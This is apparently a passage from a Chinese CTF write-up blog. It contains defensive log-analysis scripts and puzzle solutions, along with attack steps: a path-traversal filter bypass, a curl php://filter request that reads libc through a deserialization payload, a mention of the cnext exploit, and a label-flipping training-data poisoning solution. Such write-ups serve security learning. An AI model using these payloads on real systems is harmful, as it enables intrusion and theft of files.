class="hljs-subst">&#123;result&#125;</span>&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="ACL-Allow-Count"><a href="#ACL-Allow-Count" class="headerlink" title="ACL_Allow_Count"></a><strong>ACL_Allow_Count</strong></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ipaddress<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_rules</span>(<span class="hljs-params">rules_text</span>):<br>    rules = []<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> rules_text.strip().split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>        parts = line.split()<br>        action = parts[<span class="hljs-number">0</span>]<br>        proto = parts[<span class="hljs-number">1</span>]<br>        src = parts[<span class="hljs-number">2</span>]<br>        dst = parts[<span class="hljs-number">3</span>]<br>        dport = parts[<span class="hljs-number">4</span>]<br>        rules.append(&#123;<br>            <span class="hljs-string">&#x27;action&#x27;</span>: action,<br>            <span class="hljs-string">&#x27;proto&#x27;</span>: proto,<br>            <span class="hljs-string">&#x27;src&#x27;</span>: src,<br>            <span class="hljs-string">&#x27;dst&#x27;</span>: dst,<br>            <span class="hljs-string">&#x27;dport&#x27;</span>: dport<br>        &#125;)<br>    <span class="hljs-keyword">return</span> rules<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_traffic</span>(<span class="hljs-params">traffic_text</span>):<br>    traffic = []<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> traffic_text.strip().split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>        parts = line.split()<br>        proto = parts[<span class="hljs-number">0</span>]<br>        src = parts[<span class="hljs-number">1</span>]<br>        dst = parts[<span class="hljs-number">2</span>]<br>        dport = <span class="hljs-built_in">int</span>(parts[<span class="hljs-number">3</span>])<br>        traffic.append(&#123;<br>            <span class="hljs-string">&#x27;proto&#x27;</span>: proto,<br>            <span class="hljs-string">&#x27;src&#x27;</span>: src,<br>            <span class="hljs-string">&#x27;dst&#x27;</span>: dst,<br>            <span class="hljs-string">&#x27;dport&#x27;</span>: dport<br>        &#125;)<br>    <span class="hljs-keyword">return</span> traffic<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_match</span>(<span class="hljs-params">rule, flow</span>):<br>    <span class="hljs-keyword">if</span> rule[<span class="hljs-string">&#x27;proto&#x27;</span>] != <span class="hljs-string">&#x27;any&#x27;</span> <span class="hljs-keyword">and</span> rule[<span class="hljs-string">&#x27;proto&#x27;</span>] != flow[<span class="hljs-string">&#x27;proto&#x27;</span>]:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> rule[<span class="hljs-string">&#x27;src&#x27;</span>] != <span class="hljs-string">&#x27;any&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">in</span> rule[<span class="hljs-string">&#x27;src&#x27;</span>]:<br>                <span class="hljs-keyword">if</span> ipaddress.ip_address(flow[<span class="hljs-string">&#x27;src&#x27;</span>]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ipaddress.ip_network(rule[<span class="hljs-string">&#x27;src&#x27;</span>]):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> rule[<span class="hljs-string">&#x27;src&#x27;</span>] != flow[<span class="hljs-string">&#x27;src&#x27;</span>]:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> rule[<span class="hljs-string">&#x27;dst&#x27;</span>] != <span class="hljs-string">&#x27;any&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;/&#x27;</span> <span class="hljs-keyword">in</span> rule[<span class="hljs-string">&#x27;dst&#x27;</span>]:<br>                <span class="hljs-keyword">if</span> ipaddress.ip_address(flow[<span class="hljs-string">&#x27;dst&#x27;</span>]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> ipaddress.ip_network(rule[<span class="hljs-string">&#x27;dst&#x27;</span>]):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> rule[<span class="hljs-string">&#x27;dst&#x27;</span>] != flow[<span class="hljs-string">&#x27;dst&#x27;</span>]:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> rule[<span class="hljs-string">&#x27;dport&#x27;</span>] != <span class="hljs-string">&#x27;any&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(rule[<span class="hljs-string">&#x27;dport&#x27;</span>]) != flow[<span class="hljs-string">&#x27;dport&#x27;</span>]:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rules.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        rules_text = f.read()<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;traffic.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        traffic_text = f.read()<br><br>    rules = parse_rules(rules_text)<br>    traffic = parse_traffic(traffic_text)<br><br>    allow_count = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> flow <span class="hljs-keyword">in</span> traffic:<br>        matched = <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">for</span> rule <span class="hljs-keyword">in</span> rules:<br>            <span class="hljs-keyword">if</span> is_match(rule, flow):<br>                <span class="hljs-keyword">if</span> rule[<span class="hljs-string">&#x27;action&#x27;</span>] == <span class="hljs-string">&#x27;allow&#x27;</span>:<br>                    allow_count += <span class="hljs-number">1</span><br>                matched = <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">break</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;flag<span class="hljs-subst">&#123;allow_count&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="Brute-Force-Detection"><a href="#Brute-Force-Detection" class="headerlink" title="Brute_Force_Detection"></a>Brute_Force_Detection</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">detect_bruteforce_success</span>(<span class="hljs-params">log_file</span>):<br>    <span class="hljs-comment"># 初始化数据结构</span><br>    user_ip_fails = &#123;&#125;  <span class="hljs-comment"># 存储每个(user, ip)的失败时间列表</span><br>    bruteforce_ips = <span class="hljs-built_in">set</span>()  <span class="hljs-comment"># 存储满足暴力破解条件的IP</span><br>    <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(log_file, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            line = line.strip()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> line:<br>                <span class="hljs-keyword">continue</span><br>            <br>            <span class="hljs-comment"># 解析时间（前19个字符）</span><br>            <span class="hljs-keyword">try</span>:<br>                time_str = line[:<span class="hljs-number">19</span>]<br>                timestamp = datetime.strptime(time_str, <span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">continue</span><br>            <br>            <span class="hljs-comment"># 解析结果（SUCCESS/FAIL）</span><br>            parts = line.split()<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &lt; <span class="hljs-number">4</span>:<br>                <span class="hljs-keyword">continue</span><br>            result = parts[<span class="hljs-number">2</span>]<br>            <br>            <span class="hljs-comment"># 解析user和ip</span><br>            user, ip = <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">for</span> part <span class="hljs-keyword">in</span> parts[<span class="hljs-number">3</span>:]:<br>                <span class="hljs-keyword">if</span> part.startswith(<span class="hljs-string">&#x27;user=&#x27;</span>):<br>                    user = part.split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>]<br>                <span class="hljs-keyword">elif</span> part.startswith(<span class="hljs-string">&#x27;ip=&#x27;</span>):<br>                    ip = part.split(<span class="hljs-string">&#x27;=&#x27;</span>)[<span class="hljs-number">1</span>]<br>            <br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> ip:<br>                <span class="hljs-keyword">continue</span><br>            <br>            key = (user, ip)<br>            <br>            <span class="hljs-comment"># 初始化失败记录列表</span><br>            <span class="hljs-keyword">if</span> key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> user_ip_fails:<br>                user_ip_fails[key] = []<br>            <br>            <span class="hljs-comment"># 处理FAIL事件</span><br>            <span class="hljs-keyword">if</span> result == <span class="hljs-string">&#x27;FAIL&#x27;</span>:<br>                user_ip_fails[key].append(timestamp)<br>            <br>            <span class="hljs-comment"># 处理SUCCESS事件</span><br>            <span class="hljs-keyword">elif</span> result == <span class="hljs-string">&#x27;SUCCESS&#x27;</span>:<br>                fails = user_ip_fails[key]<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(fails) &gt;= <span class="hljs-number">5</span>:<br>                    <span class="hljs-comment"># 检查最近的5次失败</span><br>                    last_five = fails[-<span class="hljs-number">5</span>:]<br>                    time_diff = (last_five[-<span class="hljs-number">1</span>] - last_five[<span class="hljs-number">0</span>]).total_seconds()<br>                    <br>                    <span class="hljs-comment"># 验证时间窗口和连续性</span><br>                    <span class="hljs-keyword">if</span> time_diff &lt;= <span class="hljs-number">600</span>:  <span class="hljs-comment"># 10分钟=600秒</span><br>                        bruteforce_ips.add(ip)<br>                <br>                <span class="hljs-comment"># 重置该(user, ip)的失败记录</span><br>                user_ip_fails[key] = []<br>    <br>    <span class="hljs-comment"># 对IP地址排序（数值序）</span><br>    sorted_ips = <span class="hljs-built_in">sorted</span>(bruteforce_ips, key=<span class="hljs-keyword">lambda</span> ip: [<span class="hljs-built_in">int</span>(part) <span class="hljs-keyword">for</span> part <span class="hljs-keyword">in</span> ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)])<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;flag&#123;&#123;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;:&#x27;</span>.join(sorted_ips)&#125;</span>&#125;&#125;&quot;</span><br><br><span class="hljs-comment"># 示例使用</span><br>result = detect_bruteforce_success(<span class="hljs-string">&quot;auth.log&quot;</span>)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-08-06 21:25:49<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/sln5606e1wh0w78v">https://www.yuque.com/chaye-apqbl/vsc85q/sln5606e1wh0w78v</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/iscc/iscc%E5%8C%BA%E5%9F%9F%E8%B5%9B/"/>
    <url>/2026/01/19/WP/2025/iscc/iscc%E5%8C%BA%E5%9F%9F%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="iscc区域赛"><a href="#iscc区域赛" class="headerlink" title="iscc区域赛"></a>iscc区域赛</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="返校之路"><a href="#返校之路" class="headerlink" title="返校之路"></a>返校之路</h2><p>假加密</p><p><img src="/./img/U-Tx-E00w4AeMSfT/1746877703450-4bda06de-24bf-4be0-93d0-54dfa8e5356d-619697.png" alt="1746877703450-4bda06de-24bf-4be0-93d0-54dfa8e5356d.png"></p><p>一转眼，寒假已经过去，同学们都怀着怎样的心情踏上返校之路呢？</p><p>你是一名学生，从刚下高铁，准备乘坐19站地铁返回学校。短短的假期总是让人留恋，而返校的路似乎格外漫长。</p><p>在途中，你发现了一个神秘的压缩包，以及一张写着bfs???的纸条，这似乎隐藏着一些重要的信息。。。</p><p>掩码爆破bfsFF7</p><p><img src="/./img/U-Tx-E00w4AeMSfT/1746877839508-7dda0b1f-bfb5-41ad-9716-93b0ee58f31e-016794.png" alt="1746877839508-7dda0b1f-bfb5-41ad-9716-93b0ee58f31e.png"></p><p>part2</p><p><img src="/./img/U-Tx-E00w4AeMSfT/1747217590480-12da28cc-6381-4bc8-89a4-7bd7f8566778-526654.png" alt="1747217590480-12da28cc-6381-4bc8-89a4-7bd7f8566778.png"></p><p><img src="/./img/U-Tx-E00w4AeMSfT/1747217635512-b2c88f81-8820-4609-8abb-267f9d9df3be-265001.png" alt="1747217635512-b2c88f81-8820-4609-8abb-267f9d9df3be.png"></p><p>BZtwolpc</p><blockquote><p>更新: 2025-05-14 18:15:01<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/yf7flelepgh1h3c0">https://www.yuque.com/chaye-apqbl/vsc85q/yf7flelepgh1h3c0</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/iscc/index/"/>
    <url>/2026/01/19/WP/2025/iscc/index/</url>
    
    <content type="html"><![CDATA[<h1 id="iscc"><a href="#iscc" class="headerlink" title="iscc"></a>iscc</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="书法大师"><a href="#书法大师" class="headerlink" title="书法大师"></a>书法大师</h2><p>binwalk 照片后拿到zip</p><p>从属性里面拿到zip密钥</p><p>然后讲每两个笔画转成十六进制输出字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=&#x27;右巾 艾衣 中赛 从牛 正一 卫女 里贝 艾林 边卫 巾乙 关少 正刀 牛摔 片片 切数 杏杏 生牛 边太 众普 从土 那问 艾一 工蓝 小数&#x27;<br>stroke_dict = &#123;<br>    &#x27;艾&#x27;: 5,&#x27;衣&#x27;: 6,&#x27;刀&#x27;: 2,&#x27;从&#x27;: 4, &#x27;牛&#x27;: 4,&#x27;贝&#x27;: 4, &#x27;女&#x27;: 3,&#x27;卫&#x27;: 3,<br>    &#x27;太&#x27;: 4,&#x27;林&#x27;: 8,&#x27;一&#x27;: 1,&#x27;数&#x27;: 13,&#x27;中&#x27;: 4,&#x27;巾&#x27;: 3,&#x27;里&#x27;: 7,&#x27;生&#x27;: 5,&#x27;蓝&#x27;: 13,&#x27;切&#x27;: 4,<br>    &#x27;众&#x27;: 6,&#x27;土&#x27;: 3,&#x27;问&#x27;: 6,&#x27;乙&#x27;: 1,&#x27;右&#x27;: 5,&#x27;边&#x27;: 5,&#x27;那&#x27;: 6,&#x27;普&#x27;: 12,&#x27;片&#x27;: 4,&#x27;工&#x27;: 3,<br>    &#x27;摔&#x27;: 14,&#x27;少&#x27;: 4,&#x27;赛&#x27;: 14,&#x27;正&#x27;: 5,&#x27;关&#x27;: 6,&#x27;杏&#x27;: 7,&#x27;小&#x27;: 3,<br>&#125;<br>k=0<br>sum=0<br>for i in range(len(a)):<br>    &#x27;&#x27;&#x27;if(a[i] == text[i]):<br>         continue<br>    else:<br>        print(a[i],text[i],end=&#x27;\n&#x27;)<br>        #print(chr(b[i]),end=&#x27;&#x27;)&#x27;&#x27;&#x27;<br>    if(a[i] in stroke_dict):<br>        if(k==0):<br>            sum+=stroke_dict[a[i]]<br>            k+=1<br>            continue<br>        if(k==1):<br>            sum=sum*16+stroke_dict[a[i]]<br>            print(chr(sum),end=&#x27;&#x27;)<br>            sum=0<br>            k=0<br>            continue<br></code></pre></td></tr></table></figure><h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p><a href="https://www.hanloth.cn/tool/zero-width-secret">https://www.hanloth.cn/tool/zero-width-secret</a></p><p><img src="/./img/Uzfwl0Iemvg2cmRm/1746778172988-be97dd4c-a867-4515-8467-928bd51b0bfb-085750.png" alt="1746778172988-be97dd4c-a867-4515-8467-928bd51b0bfb.png"></p><p>得到密钥iscc2025OxVg</p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="我爱看小品"><a href="#我爱看小品" class="headerlink" title="我爱看小品"></a>我爱看小品</h2><p>py打包</p><p><img src="/./img/Uzfwl0Iemvg2cmRm/1746616925699-cd591dd1-7d32-444b-8237-7643eb84d9e5-401527.png" alt="1746616925699-cd591dd1-7d32-444b-8237-7643eb84d9e5.png"></p><p>要用3.8版本解包</p><p><img src="/./img/Uzfwl0Iemvg2cmRm/1746617005875-bc5e8544-0ec5-452b-a6e8-5065829d730f-791793.png" alt="1746617005875-bc5e8544-0ec5-452b-a6e8-5065829d730f.png"></p><p>反编译得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!/usr/bin/env python<br># visit https://tool.lu/pyc/ for more information<br># Version: Python 3.8<br><br>import mypy<br>import yourpy<br><br>def something():<br>    print(&#x27;  打工奇遇&#x27;)<br>    print(&#x27;宫室长悬陇水声&#x27;)<br>    print(&#x27;廷陵刻此侈宠光&#x27;)<br>    print(&#x27;玉池生肥咽不彻&#x27;)<br>    print(&#x27;液枯自断仙无分&#x27;)<br>    print(&#x27;酒醒玉山来映人&#x27;)<br><br><br>def check():<br>    your_input = input()<br>    if your_input[:5] == &#x27;ISCC&#123;&#x27; and your_input[-1] == &#x27;&#125;&#x27;:<br>        print(&quot;Come along, you&#x27;ll find the answer!&quot;)<br>    else:<br>        print(&#x27;Flag is wrong!&#x27;)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    mypy.myfun()<br>    something()<br>    print(&#x27;Please enter flag:&#x27;)<br>    check()<br><br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-05-09 16:10:49<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/vb8ggwe2hsh421k1">https://www.yuque.com/chaye-apqbl/vsc85q/vb8ggwe2hsh421k1</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/%E9%95%BF%E5%9F%8E%E6%9D%AF/"/>
    <url>/2026/01/19/WP/2025/%E9%95%BF%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="长城杯"><a href="#长城杯" class="headerlink" title="长城杯"></a>长城杯</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="文曲签学"><a href="#文曲签学" class="headerlink" title="文曲签学"></a>文曲签学</h2><p>长按fn进入调试</p><p><img src="/./img/adujU2FmsNdZiRo4/1757814034023-738403d5-dc66-4bc9-8fe4-a0cfe4891dfc-344759.png" alt="1757814034023-738403d5-dc66-4bc9-8fe4-a0cfe4891dfc.png"></p><p>提示：</p><p>flag在&#x2F;flag下，可以尝试目录穿越漏洞来读取它。</p><p>会过滤“..&#x2F;”，可以使用双写来绕过。</p><p>文件名有大小写区分。</p><p><img src="/./img/adujU2FmsNdZiRo4/1757817565827-70675840-1c91-4930-8d47-ac485a73776b-280989.png" alt="1757817565827-70675840-1c91-4930-8d47-ac485a73776b.png"></p><h2 id="SeRce"><a href="#SeRce" class="headerlink" title="SeRce"></a>SeRce</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><p>会自动去除末尾分号，导致不一致。</p><p>读 maps 和 libc。打cnext。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST -d <span class="hljs-string">&#x27;filetoread=php://filter/read=convert.base64-encode/resource=/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span> <span class="hljs-string">&#x27;https:///?exp=O%3A27%3A%22%5F%5FPHP%5FIncomplete%5FClass%5FName%22%3A0%3A%7B%7D%3B&#x27;</span> &gt; ./log<br></code></pre></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/readflag &gt; /tmp/res<br></code></pre></td></tr></table></figure><p>在读取 &#x2F;tmp&#x2F;res 即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">filetoread=/tmp/res<br></code></pre></td></tr></table></figure><h1 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h1><h2 id="easy-poison"><a href="#easy-poison" class="headerlink" title="easy_poison"></a>easy_poison</h2><p>将训练数据集的target的1和0交换 然后训练</p><p><a href="https://www.yuque.com/attachments/yuque/0/2025/csv/42988179/1757817715120-6bb37893-7466-4665-920a-4171b90a0212.csv">train_set_flipped.csv</a></p><p><img src="/./img/adujU2FmsNdZiRo4/1757817764032-e76d0fd7-94c3-4bac-932b-eeb755181b79-888654.png" alt="1757817764032-e76d0fd7-94c3-4bac-932b-eeb755181b79.png"></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h1><p>追踪tcp 1122流提取jar</p><p><img src="/./img/adujU2FmsNdZiRo4/1757821934435-0e4675ac-4d91-45e2-86f9-eed1445ee270-937159.png" alt="1757821934435-0e4675ac-4d91-45e2-86f9-eed1445ee270.png"></p><p>反编译拿到ECB密钥</p><p><img src="/./img/adujU2FmsNdZiRo4/1757821905683-d0c4ca1e-a2d3-4e64-b3f4-a079165df9c4-329050.png" alt="1757821905683-d0c4ca1e-a2d3-4e64-b3f4-a079165df9c4.png"></p><p>key：e45e329feb5d925b</p><p> 提取class<img src="/./img/adujU2FmsNdZiRo4/1757822806287-646e2a03-e548-4ea3-b843-48b5dcc4c3f9-948325.png" alt="1757822806287-646e2a03-e548-4ea3-b843-48b5dcc4c3f9.png"></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p><img src="/./img/adujU2FmsNdZiRo4/1757824491695-7c7d1db8-5dca-4df5-b21e-58d9bf76e4a5-915187.png" alt="1757824491695-7c7d1db8-5dca-4df5-b21e-58d9bf76e4a5.png"></p><blockquote><p>更新: 2025-09-14 12:35:03<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/mg37e4z5f64rdekb">https://www.yuque.com/chaye-apqbl/vsc85q/mg37e4z5f64rdekb</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%EF%BC%8810%E9%A2%98%EF%BC%89/"/>
    <url>/2026/01/19/WP/2025/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%EF%BC%8810%E9%A2%98%EF%BC%89/</url>
    
